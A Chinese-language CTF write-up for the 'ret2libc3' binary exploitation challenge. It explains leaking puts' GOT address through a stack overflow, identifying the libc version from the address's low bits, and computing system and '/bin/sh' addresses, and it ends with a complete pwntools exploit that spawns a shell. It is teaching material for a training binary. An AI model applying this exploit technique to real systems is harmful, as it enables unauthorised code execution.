# ret2libc3

首先查看保护：

![1-1](C:\Users\86177\Desktop\PWN\retlibc\ret2libc3\1-1.png)

![1-2](C:\Users\86177\Desktop\PWN\retlibc\ret2libc3\1-2.png)

没有找到system函数和/bin/sh字符串。

如果知道libc中某个函数的地址，进而可以知道system函数的地址。

为得到libc中某个函数的地址，一般采用got表泄露，即输出某个函数对用的got表的内容。由于libc的延迟绑定机制，需要泄露已经执行过的函数的地址。这个机制大致就是在第一次调用某个函数的时候，这个函数的got表中存放的是下一条plt表的指令的地址，经过一系列操作后得到真实地址，然后将这个真实地址放到got表中，这样之后调用这个函数的时候在got表中可以直接找到真实地址。

因为在这之前已经运行过puts函数，so，got表中放着puts的真实地址，所以我们可以将puts的真实地址打印出来。

> libc基地址   +   函数偏移量    =   函数真实地址

以下可以找到puts的真实地址：0xf7da9ca0

```
from pwn import *
io = process("./ret2libc3")
elf = ELF("./ret2libc3")
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

payload = b'a'*112 + p32(puts_plt) +p32(0xdeadbeef) + p32(puts_got)
io.recv()
io.sendline(payload)
puts_addr = hex(u32(io.recv()[0:4]))
print(puts_addr)
```

![1-3](C:\Users\86177\Desktop\PWN\retlibc\ret2libc3\1-3.png)

找到了puts的真实地址，但是还需要知道libc的版本，其实根据真实地址是可以得到libc的版本的。

ASLR，地址随机化，但即是再随机化，它的低12位保持不变，因为内存页对齐的缘故。

0xf7da9ca0的低12位是ca0，这里有个网站：https://libc.blukat.me/

可以根据低12位查到这个的版本![1-4](C:\Users\86177\Desktop\PWN\retlibc\ret2libc3\1-4.png)

这样就得到了system函数的偏移和/bin/sh的偏移。

> system_offset = 0x03d2e0
> puts_offset = 0x067ca0
> bin_sh_offset = 0x17e0af

完整EXP：

```
from pwn import *

p = process('./ret2libc3')
elf = ELF('./ret2libc3')

puts_got_addr = elf.got['puts']
puts_plt_addr = elf.plt['puts']
main_plt_addr = elf.symbols['_start']

payload = b'a'*112 + p32(puts_plt_addr) + p32(main_plt_addr) + p32(puts_got_addr)
#main_plt_addr可以使程序再次溢出

p.recv()
p.sendline(payload)

puts_addr = u32(p.recv()[0:4])

sys_offset = 0x03d2e0
puts_offset = 0x067ca0
sh_offset = 0x17e0af
#libc基地址 + 函数偏移 = 函数真实地址
libc_base_addr = puts_addr - puts_offset
sys_addr = libc_base_addr + sys_offset 
sh_addr = libc_base_addr + sh_offset 
 

payload = b'a'*112 +p32(sys_addr) + p32(0xdeadbeef) +p32(sh_addr)

p.sendline(payload)
p.interactive()
```

